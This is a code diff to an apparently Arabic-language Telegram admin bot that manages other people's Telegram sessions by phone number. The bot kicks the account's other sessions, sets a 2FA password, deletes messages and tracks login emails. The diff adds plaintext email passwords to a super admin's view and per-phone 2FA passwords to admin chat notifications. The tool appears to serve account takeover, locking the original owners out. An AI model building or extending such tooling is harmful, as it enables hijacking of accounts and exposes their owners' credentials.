@@ -105,6 +105,11 @@ async def _render_session_detail(callback: CallbackQuery, session):
     live = await session_manager.check_session_alive(phone)
     live_stat = "🟢 متصلة الآن" if live else "🔴 غير متصلة الآن"
     login_mail = database.row_login_email(session) or "❌ غير مربوط"
+    mail_lines = f"📧 بريد Login: <code>{h(login_mail)}</code>"
+    if is_super_admin(callback.from_user.id):
+        email_pw = database.row_get(session, "email_password")
+        if email_pw and login_mail != "❌ غير مربوط":
+            mail_lines += f"\n🔑 كلمة سر البريد: <code>{h(email_pw)}</code>"
     secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
     private_stat = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"
     kick_stage = database.row_get(session, "auto_kick_stage")
@@ -123,7 +128,7 @@ async def _render_session_detail(callback: CallbackQuery, session):
         f"👤 الاسم: {h(full_name)}\n"
         f"🔖 اليوزر: @{h(username)}\n"
         f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
-        f"📧 بريد Login: <code>{h(login_mail)}</code>\n"
+        f"{mail_lines}\n"
         f"📶 قاعدة البيانات: {valid_stat}\n"
         f"📡 فحص مباشر: {live_stat}\n"
         f"🛡️ خط التأمين: {kick_line}\n"
@@ -510,7 +515,8 @@ async def _on_admin_event(phone: str, event: str, **data):
             base
             + "🛡️ <b>بدء خط التأمين</b>\n"
             + mail
-            + "\n\n⏳ الترتيب: طرد الجلسات → 2FA (054321) بعد نجاح الطرد"
+            + "\n\n⏳ الترتيب: طرد الجلسات → 2FA "
+            + f"(<code>{h(database.two_fa_password_for_phone(phone))}</code>) بعد نجاح الطرد"
         )
     elif event == "kick_started":
         text = base + "🛡️ <b>بدء طرد الجلسات الأخرى</b>\n⏳ محاولة فورية أولاً..."
@@ -531,7 +537,8 @@ async def _on_admin_event(phone: str, event: str, **data):
         text = base + f"✅ <b>نجح طرد الجلسات</b> ({h(data.get('phase', ''))})\n🔐 جاري تفعيل 2FA..."
     elif event == "twofa_ok":
         if data.get("skipped"):
-            text = base + "🔐 <b>2FA</b> — كان مضبوطاً مسبقاً (054321)"
+            pw = data.get("password") or database.two_fa_password_for_phone(phone)
+            text = base + f"🔐 <b>2FA</b> — كان مضبوطاً مسبقاً (<code>{h(pw)}</code>)"
         else:
             text = (
                 base
@@ -1479,7 +1486,7 @@ async def admin_full_cleanup(callback: CallbackQuery):
     if not await _guard_session_row(callback, session):
         return
     phone, sid = session["phone"], session["id"]
-    new_pw = "Pass" + phone[-4:]
+    new_pw = database.two_fa_password_for_phone(phone)
 
     await callback.message.edit_text(
         "⏳ جاري التنظيف الشامل (طرد → 2FA → حذف رسائل)..." + ADMIN_FOOTER,
